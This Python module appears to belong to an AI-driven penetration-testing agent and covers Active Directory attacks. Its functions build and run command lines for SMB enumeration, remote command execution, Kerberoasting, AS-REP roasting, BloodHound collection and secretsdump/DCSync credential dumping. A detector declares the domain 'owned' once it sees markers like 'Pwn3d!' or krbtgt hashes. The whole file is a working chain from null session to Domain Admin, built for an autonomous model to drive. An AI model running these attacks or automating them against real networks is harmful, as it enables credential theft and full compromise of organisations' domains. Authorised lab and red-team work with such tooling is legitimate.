"""Phase 8 — Windows lateral movement & Active Directory.

The Linux post-ex modules (privesc/pivot) act *through a web foothold*. An AD attack
is network- and credential-driven instead: with a null session or a set of domain
credentials you enumerate SMB/LDAP, roast accounts, collect the BloodHound graph, run
commands on remote hosts, and dump secrets — ending at Domain Admin.

Everything shells out to tools that already live in Exegol (via `tools.run`): **nxc**
(netexec), **impacket** (secretsdump / GetUserSPNs / GetNPUsers), **bloodhound-python**.
Nothing is installed on the host. Builders are pure (return argv) so they're testable
offline; execution is a thin wrapper.

ponytail: nxc/impacket cover the lab's chain (enum → roast → dump → lateral → DA).
Local token-privilege privesc (SeImpersonate/potato) is left to the model + LOLBAS in
the RAG — add a matcher like privesc.py if an interactive Windows shell becomes a path.
"""
from __future__ import annotations

from . import tools


def _resolve(*names: str) -> str:
    """First of `names` that exists on host or in Exegol; else names[0] (so the
    error names the canonical tool)."""
    for n in names:
        if tools.have(n):
            return n
    return names[0]


def nxc() -> str:
    return _resolve("nxc", "netexec", "crackmapexec")


def impacket(script: str) -> str:
    # Exegol/Kali ship impacket both as `impacket-secretsdump` and `secretsdump.py`.
    return _resolve(f"impacket-{script}", f"{script}.py")


def _nxc_creds(user: str, password: str, nthash: str, domain: str) -> list[str]:
    """Auth flags shared by every nxc call. No creds → null session (-u '' -p '')."""
    args = ["-u", user or "", "-p" if not nthash else "-H", password if not nthash else nthash]
    if domain:
        args += ["-d", domain]
    return args


def _target_str(domain: str, user: str, password: str, target: str) -> str:
    """impacket's `domain/user:pass@host` connection string (password omitted → prompt/-no-pass)."""
    who = f"{domain}/{user}" if domain else user
    if password:
        who += f":{password}"
    return f"{who}@{target}" if target else who


def smb_argv(target: str, user: str = "", password: str = "", nthash: str = "",
             domain: str = "", extra: list[str] | None = None) -> list[str]:
    return [nxc(), "smb", target, *_nxc_creds(user, password, nthash, domain), *(extra or [])]


def exec_argv(target: str, command: str, user: str = "", password: str = "", nthash: str = "",
              domain: str = "", powershell: bool = False) -> list[str]:
    flag = "-X" if powershell else "-x"
    return smb_argv(target, user, password, nthash, domain, extra=[flag, command])


def secretsdump_argv(target: str, user: str = "", password: str = "", nthash: str = "",
                     domain: str = "", just_dc: bool = False) -> list[str]:
    argv = [impacket("secretsdump"), _target_str(domain, user, password, target)]
    if nthash:
        argv += ["-hashes", f":{nthash}"]
    if not password and not nthash:
        argv += ["-no-pass"]
    if just_dc:  # DCSync: pull the domain's secrets (krbtgt, all users) from a DC
        argv += ["-just-dc"]
    return argv


def kerberoast_argv(dc: str, domain: str, user: str, password: str = "", nthash: str = "") -> list[str]:
    argv = [impacket("GetUserSPNs"), _target_str(domain, user, password, ""),
            "-dc-ip", dc, "-request"]
    if nthash:
        argv += ["-hashes", f":{nthash}"]
    return argv


def asreproast_argv(dc: str, domain: str, user: str = "", password: str = "",
                    usersfile: str = "") -> list[str]:
    # Authenticated (creds) enumerates roastable users via LDAP; else a userlist + -no-pass.
    if user and (password or not usersfile):
        return [impacket("GetNPUsers"), _target_str(domain, user, password, ""),
                "-dc-ip", dc, "-request", "-format", "hashcat"]
    return [impacket("GetNPUsers"), f"{domain}/", "-usersfile", usersfile,
            "-dc-ip", dc, "-no-pass", "-format", "hashcat"]


def bloodhound_argv(domain: str, user: str, password: str, dc_ip: str,
                    nthash: str = "") -> list[str]:
    argv = ["bloodhound-python", "-d", domain, "-u", user, "-ns", dc_ip, "-c", "All", "--zip"]
    argv += ["--hashes", f":{nthash}"] if nthash else ["-p", password]
    return argv


def run(argv: list[str], timeout: int = 300) -> dict:
    """Execute a builder's argv through host/Exegol; merge output, cap it."""
    rc, out, err = tools.run(argv, timeout=timeout)
    return {"cmd": " ".join(argv), "rc": rc, "output": (out + ("\n" + err if err else ""))[:3000]}


# Signals that the domain/host is owned — detected centrally in the agent loop, so ANY
# tool result (nxc, secretsdump, a shell whoami) can declare the objective reached.
def owned(text: str) -> bool:
    t = (text or "").lower()
    return ("(pwn3d!)" in t              # nxc: creds grant admin/exec on the host
            or "nt authority\\system" in t
            or "domain admins" in t
            or "krbtgt:" in t)           # secretsdump reached the KDC account → full domain compromise


if __name__ == "__main__":  # offline self-check: python -m watson.ad  (no network/tools needed)
    # null session
    assert smb_argv("10.0.0.5")[1:4] == ["smb", "10.0.0.5", "-u"]
    assert smb_argv("dc", "bob", "pw", domain="corp")[-6:] == ["-u", "bob", "-p", "pw", "-d", "corp"]
    # password vs hash selects -p / -H
    assert "-p" in smb_argv("dc", "bob", "pw") and "pw" in smb_argv("dc", "bob", "pw")
    h = smb_argv("dc", "bob", nthash="aad3b...:31d6c")
    assert "-H" in h and "aad3b...:31d6c" in h and "-p" not in h

    assert exec_argv("h", "whoami", "bob", "pw")[-2:] == ["-x", "whoami"]
    assert exec_argv("h", "whoami", powershell=True)[-2] == "-X"

    sd = secretsdump_argv("dc", "bob", "pw", domain="corp", just_dc=True)
    assert sd[1] == "corp/bob:pw@dc" and "-just-dc" in sd and "-no-pass" not in sd
    sdh = secretsdump_argv("host", "admin", nthash="31d6c", domain="corp")
    assert "-hashes" in sdh and ":31d6c" in sdh and sdh[1] == "corp/admin@host"
    sdn = secretsdump_argv("host", "guest", domain="corp")  # no secret → -no-pass
    assert "-no-pass" in sdn

    kr = kerberoast_argv("10.0.0.5", "corp", "bob", "pw")
    assert kr[1] == "corp/bob:pw" and "-request" in kr and kr[kr.index("-dc-ip") + 1] == "10.0.0.5"
    ar = asreproast_argv("10.0.0.5", "corp", "bob", "pw")
    assert "-request" in ar and "hashcat" in ar
    arn = asreproast_argv("10.0.0.5", "corp", usersfile="/tmp/u.txt")  # no creds → file + -no-pass
    assert "-usersfile" in arn and "-no-pass" in arn and "corp/" in arn

    bh = bloodhound_argv("corp", "bob", "pw", "10.0.0.5")
    assert bh[:3] == ["bloodhound-python", "-d", "corp"] and "-ns" in bh and "10.0.0.5" in bh
    assert "-p" in bh and "All" in bh

    assert owned("SMB  10.0.0.5  (Pwn3d!)") and owned("krbtgt:502:aad3b...:31d6c...")
    assert owned("whoami -> NT AUTHORITY\\SYSTEM") and not owned("access denied")
    assert nxc() in ("nxc", "netexec", "crackmapexec")
    print("ad self-check ok")
